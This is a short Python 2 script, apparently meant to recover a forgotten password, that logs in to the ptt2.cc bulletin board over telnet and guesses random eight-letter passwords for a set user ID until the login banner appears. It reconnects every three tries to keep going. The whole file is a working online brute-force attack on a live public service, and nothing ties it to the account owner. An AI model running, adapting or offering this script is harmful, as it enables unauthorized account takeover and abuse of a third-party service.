# encoding: utf8

#############################################
# executing with:
#   luit -encoding big5 python rescuer.py 
#############################################

SITE_IP = "ptt2.cc"
PORT = 23
USER_ID = "your_id"
CORRECT_PATTERN = 'Announce'

##################################################

import random

alphabets = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
def passwords_to_try():
    #passwd_list = ["aaa", "bbb", "ccc", "ddd", "YhfRKixf"]
    #for passwd in passwd_list:
    #    yield passwd
    while True:
        passwd_integer_form = [random.randint(0,51) for idx in range(8)]
        if max(passwd_integer_form)<26: continue
        if min(passwd_integer_form)>25: continue
        # todo: kick out patterns with consecutive same characters
        # todo: at least two BIG/small in a pattern...... now is at least one
        yield ''.join(map(alphabets.__getitem__, passwd_integer_form))


import telnetlib
import time
import sys
import os

# todo: time.sleep: 0.01? test if this work

# actually it's still not stable right now, 
# because when it answers "not correct"
# we are not sure... maybe the correct one is omitted

tn = telnetlib.Telnet( SITE_IP, PORT )
cnt = 1
try:
    for passwd in passwords_to_try():
        if cnt % 3 == 0:
            tn.close()
            tn = telnetlib.Telnet( SITE_IP, PORT )
        time.sleep(1)
        tn.write( USER_ID + "\r\n" )
        print "[%s]" % USER_ID, 
        sys.stdout.flush()

        time.sleep(1)
        tn.write( passwd + "\r\n" )
        print "%s" % passwd, 
        sys.stdout.flush()

        time.sleep(1)
        result = tn.read_very_eager().decode('big5', 'ignore')

        if CORRECT_PATTERN in result:
            print " -- correct"
            break
        else:
            print " -- not correct"
        cnt += 1
except:
    exc_type, exc_obj, exc_tb = sys.exc_info()
    fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
    print "\n Error: ", exc_type, fname, exc_tb.tb_lineno, exc_obj
    print "End program because of error happened."

print "program ending"

